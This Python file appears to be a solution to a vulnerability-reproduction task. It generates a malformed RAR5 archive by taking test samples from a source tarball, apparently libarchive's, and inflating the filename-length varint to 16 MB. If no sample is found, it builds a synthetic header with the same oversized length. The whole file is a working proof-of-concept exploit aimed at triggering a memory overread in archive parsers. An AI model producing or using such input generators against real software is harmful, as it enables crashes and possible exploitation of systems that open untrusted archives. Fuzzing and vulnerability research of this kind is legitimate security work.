import os
import tarfile
from typing import Optional, Tuple


def leb128_encode(value: int) -> bytes:
    if value < 0:
        raise ValueError("Only non-negative values supported")
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        out.append(byte)
        if value == 0:
            break
    return bytes(out)


def leb128_decode(data: bytes, offset: int) -> Optional[Tuple[int, int]]:
    value = 0
    shift = 0
    pos = offset
    for i in range(10):  # up to 10 bytes for 64-bit
        if pos >= len(data):
            return None
        b = data[pos]
        pos += 1
        value |= ((b & 0x7F) << shift)
        if (b & 0x80) == 0:
            return value, pos - offset
        shift += 7
    return None


def is_printable_ascii(b: int) -> bool:
    return 0x20 <= b <= 0x7E


def find_ascii_sequences(data: bytes, min_len: int = 3, max_len: int = 128):
    i = 0
    n = len(data)
    while i < n:
        if is_printable_ascii(data[i]):
            start = i
            i += 1
            while i < n and is_printable_ascii(data[i]) and (i - start) < max_len:
                i += 1
            if (i - start) >= min_len:
                yield start, i
        else:
            i += 1


def has_rar5_signature(data: bytes) -> bool:
    sig = b"Rar!\x1a\x07\x01\x00"
    return len(data) >= len(sig) and data[:len(sig)] == sig


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Strategy:
        # - Search the source tarball for embedded RAR5 sample files (common in libarchive test suite).
        # - Pick a RAR5 file and mutate the filename length varint to a large value to trigger the bug.
        # - If nothing found, emit a crafted RAR5-like blob with signature and suspicious fields.
        candidates = []
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    # Filter likely test data candidates: small-ish files with .rar extension.
                    name_lower = m.name.lower()
                    if not m.isfile():
                        continue
                    if not (name_lower.endswith(".rar") or name_lower.endswith(".rar5")):
                        # Some repos may store sample data without extension; still consider small files in test dirs
                        if "rar" not in name_lower:
                            continue
                    # Limit size to avoid huge memory usage
                    if 1 <= m.size <= 512 * 1024:
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                            if has_rar5_signature(data):
                                candidates.append((m.name, data))
                        except Exception:
                            continue
        except Exception:
            candidates = []

        # Try mutation on found candidates
        for name, data in candidates:
            mutated = self._mutate_rar5_filename_length(data)
            if mutated is not None:
                return mutated

        # Fallback: craft a synthetic RAR5-like blob attempting to reach filename length parsing in vulnerable readers
        return self._fallback_blob()

    def _mutate_rar5_filename_length(self, data: bytes) -> Optional[bytes]:
        # Search printable ASCII sequences (likely filenames); try to find a preceding LEB128 varint equal to its length.
        # If found, enlarge the varint to a very big number.
        for start, end in find_ascii_sequences(data, min_len=3, max_len=256):
            segment = data[start:end]
            # Heuristic: likely filenames contain a dot
            if b'.' not in segment:
                continue
            # Try different back offsets up to 8 bytes to find varint
            seglen = end - start
            for back in range(1, 10):
                pos = start - back
                if pos < 0:
                    continue
                dec = leb128_decode(data, pos)
                if dec is None:
                    continue
                val, vlen = dec
                if vlen != back:
                    continue
                if val == seglen:
                    # Found filename length varint. Replace with a huge value.
                    # Use 16MB to exceed any sane filename length limits but not too big to cause excessive runtime memory usage.
                    new_len = 16 * 1024 * 1024
                    new_varint = leb128_encode(new_len)
                    # Construct new bytes with updated varint; we allow growth in size.
                    mutated = data[:pos] + new_varint + data[pos + vlen:]
                    # Optionally, cap overall file size to keep PoC concise by trimming trailing bytes
                    # but ensure there's some content after mutated part to proceed parsing.
                    if len(mutated) > 2000:
                        mutated = mutated[:2000]
                    return mutated
        return None

    def _fallback_blob(self) -> bytes:
        # Build a synthetic RAR5-like blob:
        # Signature + a faux "file header" layout with crafted LEB128 fields including a large filename length.
        # This is heuristic and aims to confuse permissive parsers.
        blob = bytearray()
        # RAR5 signature
        blob += b"Rar!\x1a\x07\x01\x00"
        # Fake header CRC32 (ignored by many parsers until after reading header content)
        blob += b"\x00\x00\x00\x00"
        # Base header: We will encode header_size (LEB128), type (file), flags, and a crafted file header.
        # Layout (heuristic): header_size, type=2 (file), flags=0, followed by file header fields:
        # unp_size=0, attr=0, mtime=0 (optional), method=0, name_length=big, name bytes (omitted)
        # We'll create a header payload separately to compute the size.
        header_payload = bytearray()
        # type = 2 (file)
        header_payload += leb128_encode(2)
        # flags = 0 (no extra, no data)
        header_payload += leb128_encode(0)
        # file header fields (highly simplified, likely tolerated during fuzz)
        # unp_size = 0
        header_payload += leb128_encode(0)
        # attributes = 0
        header_payload += leb128_encode(0)
        # method = 0
        header_payload += leb128_encode(0)
        # name length = big
        header_payload += leb128_encode(16 * 1024 * 1024)
        # Intentionally omit name bytes; parsers may attempt to read and overrun
        # header_size is the size of the payload
        header_size = len(header_payload)
        blob += leb128_encode(header_size)
        blob += header_payload
        # Add some padding after header to simulate trailing data
        blob += b"\x00" * 64
        # Cap size
        return bytes(blob)